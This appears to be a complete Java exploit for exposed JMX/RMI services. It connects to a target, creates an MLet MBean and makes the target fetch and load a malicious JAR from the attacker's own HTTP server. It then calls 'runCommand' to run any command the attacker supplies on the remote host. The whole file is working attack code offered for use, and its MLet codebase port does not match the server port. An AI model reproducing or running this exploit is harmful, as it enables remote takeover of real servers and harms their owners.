import javax.management.remote.*;
import javax.management.*;
import java.util.*;
import java.lang.*;
import java.io.*;
import java.net.*;
import com.sun.net.httpserver.*;
 
public class RemoteMbean {
 
    private static String JARNAME = "security.jar";
    private static String OBJECTNAME = "NewName";
    private static String EVILCLASS = "com.security.Evil";
 
    public static void main(String[] args) {
        try {
            HttpServer server = HttpServer.create(new InetSocketAddress(4141), 0);
            server.createContext("/mlet", new MLetHandler());
            server.createContext("/"+JARNAME, new JarHandler());
            server.setExecutor(null); // creates a default executor
            server.start();

            connectAndOwn(args[0], args[1], args[2]);
 
            server.stop(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    static void connectAndOwn(String serverName, String port, String command) {
    try {
        JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port +  "/jmxrmi");
        System.out.println("URL: "+u+", connecting");
 
        JMXConnector c = JMXConnectorFactory.connect(u);
 
        System.out.println("Connected: " + c.getConnectionId());
 
        MBeanServerConnection m = c.getMBeanServerConnection();
		ObjectInstance evil_bean = null;
try {
    evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
} catch (Exception e) {
    evil_bean = null;
}
if (evil_bean == null) {
    System.out.println("Trying to create bean...");
    ObjectInstance evil = null;
    try {
        evil = m.createMBean("javax.management.loading.MLet", null);
    } catch (javax.management.InstanceAlreadyExistsException e) {
        evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
    }
    System.out.println("Loaded "+evil.getClassName());
 
    Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                          new Object[] { String.format("http://%s:4141/mlet", InetAddress.getLocalHost().getHostAddress()) },
                          new String[] { String.class.getName() }
                          );
    HashSet res_set = ((HashSet)res);
    Iterator itr = res_set.iterator();
    Object nextObject = itr.next();
    if (nextObject instanceof Exception) {
        throw ((Exception)nextObject);
    }
    evil_bean  = ((ObjectInstance)nextObject);
}
System.out.println("Loaded class: "+evil_bean.getClassName()+" object "+evil_bean.getObjectName());
        System.out.println("Calling runCommand with: "+command);
        Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{ command }, new String[]{ String.class.getName() });
        System.out.println("Result: "+result);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
static class MLetHandler implements HttpHandler {
    public void handle(HttpExchange t) throws IOException {
        String response = String.format("<HTML><MLET CODE=%s ARCHIVE=%s CODEBASE=http://%s:4142/ VERSION=1.0></MLET></HTML>", EVILCLASS, JARNAME, InetAddress.getLocalHost().getHostAddress());
        System.out.println("Sending mlet: "+response+"\n");
        t.sendResponseHeaders(200, response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}
static class JarHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            System.out.println("Request made for JAR...");
            File file = new File ("compromise.jar");
            byte [] bytearray  = new byte [(int)file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            bis.read(bytearray, 0, bytearray.length);
            // ok, we are ready to send the response.
            t.sendResponseHeaders(200, file.length());
            OutputStream os = t.getResponseBody();
            os.write(bytearray,0,bytearray.length);
            os.close();
        }
    }
}
